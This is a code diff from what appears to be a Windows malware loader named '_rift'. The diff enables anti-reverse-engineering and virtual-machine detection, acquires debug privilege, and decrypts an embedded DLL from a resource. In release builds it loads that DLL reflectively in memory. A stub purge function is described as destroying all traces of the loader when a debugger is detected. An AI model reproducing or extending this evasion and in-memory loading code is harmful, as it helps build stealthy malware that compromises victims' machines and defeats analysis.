@@ -1,8 +1,6 @@
 #include "pch.h"
 #include "_rift.h"
 
-typedef BOOL(*pfnDllInit)();
-
 INT WINAPI wWinMain(
 	_In_     HINSTANCE hInstance,
 	_In_opt_ HINSTANCE hPrevInstance,
@@ -16,18 +14,51 @@ INT WINAPI wWinMain(
 	GetCurrentDirectoryW(sizeof(g_szCD) / sizeof(*g_szCD), g_szCD);
 	g_hPH = GetProcessHeap();
 
-	// BOOL bRE = fnAntiRE();
-	// BOOL bVM = fnCheckVMPresent();
+#ifndef _DEBUG
+	BOOL bRE = fnAntiRE();
+#endif
+	fnAdjustPrivilege(SE_DEBUG_NAME, TRUE);
+	BOOL bVM = fnCheckVMPresent();
 
 	fnAllocConsole();
 
-	fnUnpackResource(L"_rift.KEY", L"a", IDR_RIFTDLL);
-	HMODULE hDll = LoadLibraryExW(L"_riftdll.dll", 0, LOAD_LIBRARY_SEARCH_APPLICATION_DIR);
+	SIZE_T nDll;
+	PVOID pDll = fnUnpackResource(L"_rift.KEY", IDR_RIFTDLL, &nDll);
+	if (!pDll)
+		return 0x1;
+
+	/* "Reflective DLL loading will only be used in the release build "
+
+	*/
+#ifndef _DEBUG
+	HMEMORYMODULE hDll = MemoryLoadLibrary(pDll, nDll);
 	if (!hDll)
-		return 2;
+		return 0x2;
 
-	pfnDllInit fnDllInit = (pfnDllInit)GetProcAddress(hDll, "fnDllInit");
+	pfnDllInit fnDllInit = (pfnDllInit)MemoryGetProcAddress(hDll, "fnDllInit");
+	int a = fnDllInit(10);
 
-	FreeLibrary(hDll);
+	MemoryFreeLibrary(hDll);
+#else
+	HMODULE dhDll = LoadLibraryExW(L"_riftdll.dll", 0, LOAD_LIBRARY_SEARCH_APPLICATION_DIR);
+	if (!dhDll)
+		return 0x2;
+
+	pfnDllInit fnDllInit = (pfnDllInit)GetProcAddress(dhDll, "fnDllInit");
+	int a = fnDllInit(10);
+
+	FreeLibrary(dhDll);
+#endif
+
+	HeapFree(g_hPH, 0, pDll);
 	return 0;
+}
+
+/*	This function basically does what it's called,
+	it "cleans" (or better purges) everything it can and tries to destroy
+	all traces of it self (the loader and everything else it extracts).
+	It should get triggered ( / called) if any fatal error occurs,
+	or the loader catches any suspicious activities (e.g. debuggers).  */
+VOID fnPurge() {
+
 }
